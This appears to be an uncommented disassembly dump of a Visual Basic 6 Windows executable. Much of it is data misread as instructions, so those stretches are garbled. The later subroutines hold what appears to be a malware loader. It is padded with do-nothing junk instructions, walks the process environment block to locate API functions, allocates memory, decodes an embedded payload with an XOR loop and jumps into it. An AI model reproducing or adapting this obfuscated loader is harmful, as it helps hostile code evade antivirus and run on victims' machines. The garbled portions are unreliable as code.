_start
push r-xdata
call Ordinal_MSVBVM60_100
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
retn 0x8623
sub_4012a3
dec edx
lahf
push edx
mov al [ 0x2dcdaa8c ]
insd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
outsb
dec ebp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] cl
add [ ebx + 0x74 ] dl
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
push ss
bound ebp [ edi + 0x72 ]
outsb
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
or [ eax ] eax
push ebx
je r-xdata
arpl [ ecx + 0x72 ] sp
imul ebp [ edi + 0x75 ] 0x34796c73
add [ ebp + 0x2e ] ah
add [ eax ] al
add [ eax ] al
dec esp
xor [ eax ] eax
add dl cl
xchg edx eax
mov esi [ ecx + esi * 4 - 0x50b55c55 ]
hlt
inc eax
add [ edx ] al
[ ecx ] al
add bh bh
add [ eax ] al
add [ eax ] al
les edx [ esi ]
bound esp [ edx + 0x6f ]
jb r-xdata
add [ eax ] al
xor eax [ eax ]
or eax 0x43000601
outsd
insb
outsd
outsb
xor eax [ eax ]
sbb [ ecx ] eax
add [ edx ] al
and al [ eax ]
and al 0x6
add [ ebx + 0x6f ] al
insb
outsd
outsb
xor eax [ eax ]
xor eax 0xa2f
bound eax [ edx ]
add [ eax ] al
pop edx
add [ eax ] al
add [ edx ] bl
add [ eax ] al
inc esp
add bh bh
add al 0x0
pop es
add [ eax ] al
add [ ebx ] cl
inc eax
add [ edi ] al
add [ eax ] al
add [ eax + 0x56004022 ] dh
inc edx
xor eax 0x2a263621
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
add [ eax ] al
add [ eax ] al
sub_4013cd
adc al 0x40
add [ eax + 0x13 ] dh
inc eax
add [ edx + edx + 0x780040 ] cl
add [ eax ] al
add [ eax ] 0x8a0000
add [ eax ] al
mov eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edx
outsd
je r-xdata
xor bh dh
inc esi
inc edx
or [ ecx - 0x5f78b166 ] dh
adc ecx [ ecx - 0x7ac71f26 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x6c ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
daa
inc eax
add [ eax + eax + 0x500000 ] bl
add [ eax ] al
pop edi
xchg esi eax
jge r-xdata
push 0x69540065
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
and eax 0xec0040
jns r-xdata
add [ eax + eax ] cl
add [ eax ] dl
add [ eax ] al
bound ebp [ ebp ]
add [ eax + 0x72 ] dl
arpl [ gs : ecx + 0x72 ] sp
imul ebp [ edi + 0x75 ] 0x34796c73
add [ eax ] al
add [ eax ] al
push eax
add [ eax ] al
add dl cl
xchg edx eax
mov esi [ ecx + esi * 4 - 0x50b55c55 ]
hlt
add [ edi ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ esi + 0x13c0040 ] bl
add [ eax ] al
add [ eax ] eax
add [ eax ] al
pop eax
and [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov esp 0xffff0043
mov ch [ eax + eax * 2 - 0x5 ]
xor al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebp - 0x48 ] cl
or [ eax - 0x3d ] ch
jpo r-xdata
add [ eax ] al
push eax
add [ eax ] al
add [ edi ] dl
mov ebx 0xc0b04412
aam 0x4a
xchg edx eax
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ebp + 0xec0040 ] dl
inc esi
0x0 0x0
sub_40160b
push [ eax - 0x42ffbfea ]
push ss
inc eax
add [ eax ] al
add [ eax ] al
add ah ah
adc eax 0x155c0040
inc eax
add [ eax + 0x12 ] ch
inc eax
add [ esi + 0x12 ] ch
inc eax
add [ edx + edx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x4016 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4016 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x3304246c ] al
add [ eax ] al
add cl ch
scasd [ edi ]
cmpsb [ esi ] [ edi ]
add eax [ eax ]
sub [ esp + 0x4 ] 0x33
jmp r-xdata
push ebp
mov ebp esp
sub esp 0xc
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
mov [ ebp - 0x4 ] eax
and [ ebp + 0x8 ] 0xfffffffe
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
sub_404283
mov esi _CIcos@IAT
push eax
sub eax eax
pop eax
push ebx
or ebx ebx
pop ebx
lodsd [ esi ]
push eax
sub eax eax
pop eax
cmp eax 0x0
je r-xdata
push ebx
or ebx ebx
pop ebx
mov ebx 0x83ec8b54
push ebx
or ebx ebx
pop ebx
inc ebx
nop
cmp [ eax ] ebx
jne r-xdata
push eax
sub eax eax
pop eax
mov ebx 0x8d560ceb
push eax
add eax eax
pop eax
inc ebx
push ebx
or ebx ebx
pop ebx
cmp [ eax + 0x4 ] ebx
jne r-xdata
push ebx
or ebx ebx
pop ebx
xor ebx ebx
nop
push ebx
push ebx
or ebx ebx
pop ebx
push ebx
nop
push ebx
push ebx
or ebx ebx
pop ebx
push esp
nop
push 0x40000
push eax
sub eax eax
pop eax
push edx
push eax
sub eax eax
pop eax
push ecx
push eax
add eax eax
pop eax
push esp
push eax
sub eax eax
pop eax
mov [ ebp + 0xc0 ] eax
push ebx
or ebx ebx
pop ebx
call eax
nop
add esp 0x1c
push ebx
or ebx ebx
pop ebx
retn
sub_404306
xor ebx ebx
xor ebx 0x523306a
nop
push ebx
or ebx ebx
pop ebx
nop
push eax
sub eax eax
pop eax
push eax
sub eax eax
pop eax
mov edx [ eax + ecx ]
push eax
add eax eax
pop eax
push eax
sub eax eax
pop eax
push ebx
or ebx ebx
pop ebx
xor [ eax + ecx ] ebx
nop
retn
sub_404330
push ebx
or ebx ebx
pop ebx
nop
push eax
sub eax eax
pop eax
mov ecx 0x77
push 0x0
loop r-xdata
push 0x2cc1515f
push 0x0
push 0x1e8
mov [ ebp + 0x52 ] esp
add esp 0x1e8
jmp r-xdata
call sub_404359
jae r-xdata
add [ eax - 0x24f6acc0 ] dl
insb
insb
xor esi [ edx ]
add [ eax - 0x1 ] bl
jne r-xdata
pop ebx
cmp [ eax ] 0xc247c8b
jne r-xdata
inc eax
push ebx
or ebx ebx
push ebx
or ebx ebx
pop ebx
cmp [ eax + 0x4 ] 0x87cff85
jne r-xdata
push ebx
or ebx ebx
pop ebx
mov eax [ eax + 0x2 ]
push eax
sub eax eax
pop eax
mov eax [ eax ]
nop
push 0x2
call eax
mov [ ebp + 0x96 ] 0x2000
push eax
add eax eax
pop eax
push ebx
or ebx ebx
pop ebx
mov [ ebp + 0x9a ] 0x1000
jmp r-xdata
push eax
add eax eax
pop eax
sub eax 0x2
nop
push [ ebp + 0x96 ]
push ebx
or ebx ebx
pop ebx
call eax
nop
mov ecx [ ebp + 0x9a ]
push eax
add eax eax
pop eax
mov edi eax
push ebx
or ebx ebx
pop ebx
[ edi ] [ esi ]
push eax
sub eax eax
pop eax
mov ecx [ ebp + 0x96 ]
nop
nop
push ebx
or ebx ebx
pop ebx
call sub_4043a8
aas
mov ecx 0x28cb61c6
and eax [ 0x3563bb6a ]
0x65042148 0x12b4
push eax
add eax eax
pop eax
call sub_404306
dec cx
dec cx
dec cx
dec cx
jge r-xdata
nop
jmp eax
sub_404359
pop ecx
jmp r-xdata
call sub_40435f
push ebx
push 0x5f6c6c65
dec esi
outsd
je r-xdata
push 0xffffffb9
cmpsb [ esi ] [ edi ]
jns r-xdata
fcom st5
xor [ ecx - 0x44527303 ] edi
sub edx [ esi ]
xor [ ecx + 0x5 ] cl
cmp eax 0xeb1172cf
or esi [ ecx + 0x41 ]
cmp dh [ esi + edx * 2 + 0xc ]
jmp r-xdata
and ebp esp
retn 0x2330
add al 0xe9
enter 0xa22 0xef
into
and [ 0x1217d96a ] eax
push 0x30
jpe r-xdata
arpl [ edi + 0x6e ] bp
inc ecx
add al ch
cmp eax 0x3fffffff
mov ecx 0x28cb61c6
and eax [ 0x3563bb6a ]
0x65042148 0x12b4
adc [ eax ] ah
add eax 0xa9af3f6a
imul esi [ eax ] 0x23
test [ ecx ] dl
xor al 0x7b
in eax dx
nop
jmp eax
daa
xor al 0xca
jbe r-xdata
add eax 0x1172cf3d
jmp r-xdata
xchg ecx eax
push 0x30
and ebp esp
cld
and eax [ es : 0xffffffffa1aeb933 ]
push 0x30
and ebp esp
stosb [ edi ]
and eax [ es : 0x154fd830 ]
push 0x30
fcom st5
cmp bh [ ebx + 0x5c83016e ]
cmp al [ 0x5ecb6a6a ]
jpe r-xdata
xor [ ebx ] ah
pop edi
cmp [ ecx - 0x4695facd ] 0xa6
push esp
dec edi
jno r-xdata
pop es
push 0x30
sub al 0x89
cmc
xor [ ebx ] esp
add eax 0xec277de1
cmp ah [ esi ]
and eax [ 0xa83d830 ]
push 0x30
dec ecx
add [ ebp + 0x5ea447e0 ] dl
xor [ ebx ] ah
add eax 0xa26c8e9
out dx eax
fisub [ edx ]
add eax 0x16ebb6a
xor [ ecx + 0x35 ] 0x5
push 0x6a

sub al 0x80
mov al 0x18
add eax 0x4d2b465
push 0x30
mov [ 0x23326abe ] eax
add eax 0xe1a73f6a
imul esi [ eax ] 0x23
mov [ edx - 0x7cf25796 ] ss
xchg ecx eax
add eax 0x5575686a
add [ eax ] dl
jno r-xdata
nop
0x2330
test eax 0xe1052331
or ebp [ eax + 0x235a3c02 ]
push edx
xchg ebp eax
pushad
add eax [ ecx + edx * 2 + 0x6a052010 ]
aas
scasd [ edi ]
test eax 0x8423306b
adc [ ebx + edi * 2 ] esi
imul ebx [ edx + 0x23 ] 0x52
xchg ebp eax
popad
arpl [ esi - 0x7fd3cf6e ] ax
sub_40435f
pop edx
call sub_404283
push eax
push [ ebp + 0x52 ]
push 0x0
call eax
cmp eax 0x1
je r-xdata
pop eax
push [ ebp + 0x52 ]
call sub_404359
jae r-xdata
call sub_4043a8
aas
mov ecx 0x28cb61c6
and eax [ 0x3563bb6a ]
0x65042148 0x12b4
add [ eax - 0x24f6acc0 ] dl
insb
insb
xor esi [ edx ]
add [ eax - 0x1 ] bl
jne r-xdata
pop ebx
cmp [ eax ] 0xc247c8b
jne r-xdata
inc eax
push ebx
or ebx ebx
push ebx
or ebx ebx
pop ebx
cmp [ eax + 0x4 ] 0x87cff85
jne r-xdata
push ebx
or ebx ebx
pop ebx
mov eax [ eax + 0x2 ]
push eax
sub eax eax
pop eax
mov eax [ eax ]
nop
push 0x2
call eax
mov [ ebp + 0x96 ] 0x2000
push eax
add eax eax
pop eax
push ebx
or ebx ebx
pop ebx
mov [ ebp + 0x9a ] 0x1000
jmp r-xdata
push eax
add eax eax
pop eax
sub eax 0x2
nop
push [ ebp + 0x96 ]
push ebx
or ebx ebx
pop ebx
call eax
nop
mov ecx [ ebp + 0x9a ]
push eax
add eax eax
pop eax
mov edi eax
push ebx
or ebx ebx
pop ebx
[ edi ] [ esi ]
push eax
sub eax eax
pop eax
mov ecx [ ebp + 0x96 ]
nop
nop
push ebx
or ebx ebx
pop ebx
push eax
add eax eax
pop eax
call sub_404306
dec cx
dec cx
dec cx
dec cx
jge r-xdata
nop
jmp eax
sub_4043a8
pop esi
push eax
sub eax eax
pop eax
mov eax [ fs : 0x30 ]
push eax
sub eax eax
pop eax
mov eax [ eax + 0xc ]
push ebx
or ebx ebx
pop ebx
mov eax [ eax + 0x14 ]
push eax
sub eax eax
pop eax
mov eax [ eax + 0x14 ]
nop
dec eax
push eax
add eax eax
pop eax
cmp [ eax ] 0x25ff
jne r-xdata
push ebx
or ebx ebx
pop ebx
mov eax [ eax + 0x2 ]
push eax
sub eax eax
pop eax
mov eax [ eax ]
nop
inc eax
push ebx
or ebx ebx
pop ebx
cmp [ eax ] 0xc247c8b
jne r-xdata
push ebx
or ebx ebx
pop ebx
cmp [ eax + 0x4 ] 0x87cff85
jne r-xdata
push eax
add eax eax
pop eax
sub eax 0x2
nop
push [ ebp + 0x96 ]
push ebx
or ebx ebx
pop ebx
call eax
nop
mov ecx [ ebp + 0x9a ]
push eax
add eax eax
pop eax
mov edi eax
push ebx
or ebx ebx
pop ebx
[ edi ] [ esi ]
push eax
sub eax eax
pop eax
mov ecx [ ebp + 0x96 ]
nop
nop
push ebx
or ebx ebx
pop ebx
push eax
add eax eax
pop eax
call sub_404306
dec cx
dec cx
dec cx
dec cx
jge r-xdata
nop
jmp eax
sub_40447e
push es
push 0x30
mov bl 0x95
push cs
xchg ecx eax
xor eax 0x8e23306a
dec ebx
xchg ebp eax
cli
adc al 0x53
xchg ebp eax
cli
xor [ eax ] ebp
dec ebx
add eax 0x6f23307a
bound esp [ ebx - 0x24 ]
aad 0x3a
fst [ edx ]
adc ebp [ edx + 0x30 ]
jpe r-xdata
push ebx
and eax [ es : 0x1513d830 ]
push 0x30
stosb [ edi ]
retn
adc eax [ 0xffffffff95b3306a ]
loopne r-xdata
loop r-xdata
or al 0x53
or ch dh
and [ es : 0x522886a ] al
push 0x30
sub al 0xa7
jecxz r-xdata
jge r-xdata
je r-xdata
retn
push 0xffffffb9
cmpsb [ esi ] [ edi ]
jns r-xdata
fcom st5
xor [ ecx - 0x44527303 ] edi
sub edx [ esi ]
xor [ ecx + 0x5 ] cl
cmp eax 0xeb1172cf
or esi [ ecx + 0x41 ]
cmp dh [ esi + edx * 2 + 0xc ]
jmp r-xdata
and ebp esp
retn 0x2330
add al 0xe9
enter 0xa22 0xef
into
and [ 0x1217d96a ] eax
push 0x30
jpe r-xdata
arpl [ edi + 0x6e ] bp
inc ecx
add al ch
cmp eax 0x3fffffff
mov ecx 0x28cb61c6
and eax [ 0x3563bb6a ]
0x65042148 0x12b4
adc [ eax ] ah
add eax 0xa9af3f6a
imul esi [ eax ] 0x23
test [ ecx ] dl
xor al 0x7b
in eax dx
nop
jmp eax
daa
xor al 0xca
jbe r-xdata
add eax 0x1172cf3d
jmp r-xdata
xchg ecx eax
push 0x30
and ebp esp
cld
and eax [ es : 0xffffffffa1aeb933 ]
push 0x30
and ebp esp
stosb [ edi ]
and eax [ es : 0x154fd830 ]
push 0x30
fcom st5
cmp bh [ ebx + 0x5c83016e ]
cmp al [ 0x5ecb6a6a ]
jpe r-xdata
xor [ ebx ] ah
pop edi
cmp [ ecx - 0x4695facd ] 0xa6
push esp
dec edi
jno r-xdata
pop es
push 0x30
sub al 0x89
cmc
xor [ ebx ] esp
add eax 0xec277de1
cmp ah [ esi ]
and eax [ 0xa83d830 ]
push 0x30
dec ecx
add [ ebp + 0x5ea447e0 ] dl
xor [ ebx ] ah
add eax 0xa26c8e9
out dx eax
fisub [ edx ]
add eax 0x16ebb6a
xor [ ecx + 0x35 ] 0x5
push 0x6a

sub al 0x80
mov al 0x18
add eax 0x4d2b465
push 0x30
mov [ 0x23326abe ] eax
add eax 0xe1a73f6a
imul esi [ eax ] 0x23
mov [ edx - 0x7cf25796 ] ss
xchg ecx eax
add eax 0x5575686a
add [ eax ] dl
jno r-xdata
nop
0x2330
test eax 0xe1052331
or ebp [ eax + 0x235a3c02 ]
push edx
xchg ebp eax
pushad
add eax [ ecx + edx * 2 + 0x6a052010 ]
aas
scasd [ edi ]
test eax 0x8423306b
adc [ ebx + edi * 2 ] esi
imul ebx [ edx + 0x23 ] 0x52
xchg ebp eax
popad
arpl [ esi - 0x7fd3cf6e ] ax
sub_404f4d
sub eax 0x239aee0a
add eax 0x5ac0d6a
push 0xfffffff0
sub al 0x81
cmc
xor [ ebx ] ah
add eax 0x5258a57
push 0x3f
cmpsd [ esi ] [ edi ]
xchg ecx eax
push 0x30
and edi [ eax ]
scasd [ edi ]
and eax [ ss : 0x5aab465 ]
push 0x30
push ds
sbb [ edx + 0x30 ] ch
jecxz r-xdata
push edi
jb r-xdata
out dx al
dec esi
and eax [ 0x5600d6a ]
push 0x577257f0
push 0x30
dec ebx
pop es
push 0x31
and edi edx
adc eax 0x44aa0523
push ebx
cmp ah bh
xor [ ebx ] ah
lds ebx [ esi ]
pop ecx
push ds
add [ edx + 0x30 ] ebp
mov [ 0x340d0871 ] eax
add eax 0x5e57f06a
push edi
jge r-xdata
add al 0x6a
xor al cl
in al 0x2
xor al 0x23
add al 0x2a
iretd
inc esi
mov al [ edi + esi * 2 + 0x38 ]
or [ ebx + 0x4e ] eax
in eax 0x1e
jge r-xdata
xor [ ebx ] ah
add [ ebp - 0x4c ] ah
and al 0x4
push 0x30
dec ecx
add al 0x95
movsd [ edi ] [ esi ]
mov bh 0x5
push es
push 0x30
mov [ 0x260d1271 ] eax
add eax 0x812cf06a
in al dx
xor [ ebx ] ah
add eax 0x5233157
0x58ee4544 0x9cb3
sub_404ffd
loopne r-xdata
mov ebx 0x3950d7c
fcom [ eax + 0xa ]
mov ebx 0x306bada4
and ecx [ edi + ebp - 0x140155d4 ]
push edi
add al 0x6a
xor [ eax + 0x6f ] dh
sub cl bh
xchg esp eax
sub [ ebx + 0x30 ] 0xb0ddfa23
and al [ 0xd7cbb6a ]
xchg ebp eax
add ebx esp
push eax
or bl [ eax + 0x21 ]
add eax 0xb2dc306b
xor [ ebx ] esp
add eax 0x4b78795
push 0x30
fcom [ edx + 0x5233116 ]
loope r-xdata
imul esi [ eax ] 0x22
test [ ebp + 0x6a04bb87 ] edx
xor ah bl
mov dl 0xfe
xor [ ebx ] esp
add eax 0x45fa795
push 0x30
enter 0x2e4 0x34
and eax [ edx + ebp ]
iretd
mov eax [ edx + ebp * 2 ]
xor [ edx - 0x274689c0 ] ch
test [ ecx + 0x6a052244 ] ch
arpl [ ecx + 0x1 ] cx
xchg ebp eax
xchg [ edi - 0x23cf95fc ] esp
mov dl 0xea
xor [ ebx ] esp
add eax 0xfa2b6fe1
pop ecx
iretd
sub_40505d
push edi
add al 0x6a
xor [ eax + 0x6f ] dh
outsb
pop eax
and edx [ 0x72dc306a ]
outsb
mov ebx 0x3950d7c
fcom [ eax + 0xa ]
mov ebx 0x306bada4
and ecx [ edi + ebp - 0x140155d4 ]
push edi
add al 0x6a
xor [ eax + 0x6f ] dh
sub cl bh
xchg esp eax
sub [ ebx + 0x30 ] 0xb0ddfa23
and al [ 0xd7cbb6a ]
xchg ebp eax
add ebx esp
push eax
or bl [ eax + 0x21 ]
add eax 0xb2dc306b
xor [ ebx ] esp
add eax 0x4b78795
push 0x30
fcom [ edx + 0x5233116 ]
loope r-xdata
mov eax [ edx + ebp * 2 ]
xor [ edx - 0x274689c0 ] ch
test [ ecx + 0x6a052244 ] ch
arpl [ ecx + 0x1 ] cx
xchg ebp eax
xchg [ edi - 0x23cf95fc ] esp
mov dl 0xea
xor [ ebx ] esp
add eax 0xfa2b6fe1
pop ecx
iretd
sub_405127
loopne r-xdata
and [ ebx - 0x17 ] esp
push cs
fdiv [ eax + 0x69 ]
mov bl 0xcd
pop es
push ecx
jl r-xdata
sub ecx [ ebp - 0x799dc482 ]
pop ss
or al 0x23
jno r-xdata
and ebx [ ebp - 0x20 ]
xor [ ebx + 0x2330c280 ] ch
add eax 0x58b8dea
push 0x30
and cl [ edx ]
out dx al
fbld [ ebx ]
add eax 0x2167bb6a
jle r-xdata
or [ esi ] edx
cli
0x6488
push esp
push esp
cmp [ ecx - 0x385ffb07 ] edi
cli
mov esi 0x523316a
imul ebp eax 0xffffffaa
retn
pushad
jb r-xdata
xor [ esi - 0x2f ] edx
xor [ ecx + 0x2c ] ebp
jb r-xdata
0x6a058b8d 0x2230
mov eax 0x278eebb9
or al 0xd4
hlt
sub al 0x99
mov bl 0xe0
add al 0x1f
xor ch [ edx + 0x2934e3fe ]
xchg [ ebx + 0x31d15631 ] ch
imul ebp [ edx + esi * 2 ] 0x58b8dea
push 0x30
and [ edx ] ecx
out dx al
cmpsd [ esi ] [ edi ]
and eax [ 0x95ebb6a ]
loope r-xdata
lea ecx [ ebx + 0x21306a05 ]
or ch dh
push cx
imul esi [ eax ] 0x23
add eax 0x842f4de1
lodsd [ esi ]
push ds
add eax 0x34fdb96a
stosb [ edi ]
add eax edi
xor al 0xa3
add ecx esi
sti
test eax 0x6a1a37ba
loopne r-xdata
pop es
adc [ edx ] ecx
push 0x30
stosd [ edi ]
or [ ebp - 0x2f ] esp
fdiv [ ecx + esi * 4 ]
or [ ebp - 0x48 ] ebp
das
sbb ah dl
and al 0x24
add eax 0xa2fbabb
pop edx
cli
adc al 0x2f
jo r-xdata
add edx ebp
xor al 0xb8
mov edx 0x2c680a27
xor eax 0x7baa905
sbb ah dl
adc al 0x2c
lea ebp [ esi + 0x2f ]
bound eax [ ebx + edx * 4 + 0x6a052230 ]
inc esp
inc edi
jmp r-xdata
or dh [ ecx + 0x3057c7e4 ]
and esi [ ebx ]
mov [ ebx ] esp
add al 0x6a
xor [ ebx - 0x272e9af7 ] ch
xor al 0xb1
mov cl 0xe4
mov ebx 0xf7eb095e
loope r-xdata
ja r-xdata
push 0x30
insb
xor al 0xa3
mov [ edx ] esp
add al 0x6a
xor ch ah
add [ ebp + 0x30 ] esp
retn 0xa8ff
stosb [ edi ]
pop eax
add bh [ edx + 0x387e8d30 ]
pushad
inc esp
0x9e70230b 0xd3d8
and edx [ esi - 0x6b ]
inc ebp
in eax dx
pop ebp
xor ah [ ebx ]
add eax 0x842f6de1
test eax 0x6a053330
arpl [ edx + 0x233d6ac6 ] sp
add eax 0x60d839
push 0x30
stosb [ edi ]
sub_405160
xor [ ebx ] ah
pop ebp
loopne r-xdata
sub [ ecx + ebx * 4 ] eax
aas
int3
stosd [ edi ]
add dl 0x30
and eax [ 0x58b8dea ]
push 0x30
and cl [ edx ]
out dx al
fbld [ ebx ]
add eax 0x2167bb6a
jle r-xdata
xor [ esi - 0x2f ] edx
xor [ ecx + 0x2c ] ebp
jb r-xdata
push esp
push esp
cmp [ ecx - 0x385ffb07 ] edi
cli
mov esi 0x523316a
imul ebp eax 0xffffffaa
retn
sub al 0x99
mov bl 0xe0
add al 0x1f
xor ch [ edx + 0x2934e3fe ]
xchg [ ebx + 0x31d15631 ] ch
imul ebp [ edx + esi * 2 ] 0x58b8dea
push 0x30
and [ edx ] ecx
out dx al
cmpsd [ esi ] [ edi ]
and eax [ 0x95ebb6a ]
loope r-xdata
lea ecx [ ebx + 0x21306a05 ]
or ch dh
push cx
imul esi [ eax ] 0x23
add eax 0x842f4de1
lodsd [ esi ]
push ds
add eax 0x34fdb96a
stosb [ edi ]
add eax edi
xor al 0xa3
add ecx esi
sti
test eax 0x6a1a37ba
loopne r-xdata
pop es
adc [ edx ] ecx
push 0x30
stosd [ edi ]
or [ ebp - 0x2f ] esp
fdiv [ ecx + esi * 4 ]
or [ ebp - 0x48 ] ebp
das
sbb ah dl
and al 0x24
add eax 0xa2fbabb
pop edx
cli
adc al 0x2f
jo r-xdata
add edx ebp
xor al 0xb8
mov edx 0x2c680a27
xor eax 0x7baa905
sbb ah dl
adc al 0x2c
lea ebp [ esi + 0x2f ]
bound eax [ ebx + edx * 4 + 0x6a052230 ]
inc esp
inc edi
jmp r-xdata
or dh [ ecx + 0x3057c7e4 ]
and esi [ ebx ]
mov [ ebx ] esp
add al 0x6a
xor [ ebx - 0x272e9af7 ] ch
xor al 0xb1
mov cl 0xe4
mov ebx 0xf7eb095e
loope r-xdata
ja r-xdata
push 0x30
insb
xor al 0xa3
mov [ edx ] esp
add al 0x6a
xor ch ah
add [ ebp + 0x30 ] esp
retn 0xa8ff
stosb [ edi ]
pop eax
add bh [ edx + 0x387e8d30 ]
pushad
inc esp
0x9e70230b 0xd3d8
and edx [ esi - 0x6b ]
inc ebp
in eax dx
pop ebp
xor ah [ ebx ]
add eax 0x842f6de1
test eax 0x6a053330
arpl [ edx + 0x233d6ac6 ] sp
add eax 0x60d839
push 0x30
stosb [ edi ]
sub_4052b3
loope r-xdata
add ebp [ edx + 0x30 ]
jpo r-xdata
das
add [ edx + 0x20 ] ch
and eax [ 0x52fca83 ]
push 0x6b
stosb [ edi ]
pop eax
add bh [ edx + 0x387e8d30 ]
pushad
inc esp
0x9e70230b 0xd3d8
and ebp ebp
jecxz r-xdata
insb
fld [ edi + 0x7b306a03 ]
xor al 0xa3
jae r-xdata
dec eax
jbe r-xdata
and eax [ 0x7022c8e9 ]
fcos
cmp al 0x36
and eax [ 0xffffffff842f6de1 ]
and dh [ eax + 0x62 ]
dec ebx
insb
xor [ ebx ] ah
xchg [ edx - 0x53d4a9cf ] dl
add eax [ ss : ebx - 0x54 ]
or al 0x43
lodsb [ esi ]
jno r-xdata
test eax 0x6a053330
xor ebp ebp
xor al 0xa3
jo r-xdata
and eax [ ss : 0xffffffff842f6de1 ]
sub [ esi ] dh
and eax [ 0x3e5fe6b ]
les ebp [ edx + 0x2b ]
and eax [ 0x14ab20e0 ]
lodsb [ esi ]
jbe r-xdata
aas
add eax 0xfa74666a
aas
add [ edx - 0x1a4c91bd ] ch
or eax 0xfa753000
sbb al 0xcc
sub esi [ ebx - 0x4cf3f81d ]
add eax 0x14ab20e0
lodsb [ esi ]
add eax [ ss : ebx - 0x54 ]
jo r-xdata
add eax 0x300d96a
push 0x30
jpo r-xdata
mov ebx 0xb8e10966
daa
sbb [ edx + 0x30 ] ebp
sbb eax [ 0x48a8c21f ]
pop es
or al 0xb3
lodsb [ esi ]
jpe r-xdata
inc ebp
and bh [ ecx - 0x27169e9a ]
and [ ebx + ebx * 4 + 0xc07e3b3 ] ecx
mov ebx 0xb0c0d37
aaa
push cs
pop ds
shr [ edx - 0x1b ] 0x99
mov bl 0xe3
pop es
imul eax eax 0x12
int3
push 0x5a
and edx [ ebp - 0x6b ]
inc ebp
aaa
outsd
push 0x5a
and edi edx
aas
pushad
test al 0x40
jb r-xdata
mov cl 0xe2
add eax 0x48a8c21f
lodsb [ esi ]
jo r-xdata
pop eax
and eax [ 0xfffffffffa75706a ]
aas
adc [ edx + 0x2f45e1c2 ] ch
test [ eax + esi + 0x5a6a053f ] ch
and edx [ ebx - 0x6b ]
inc esi
daa
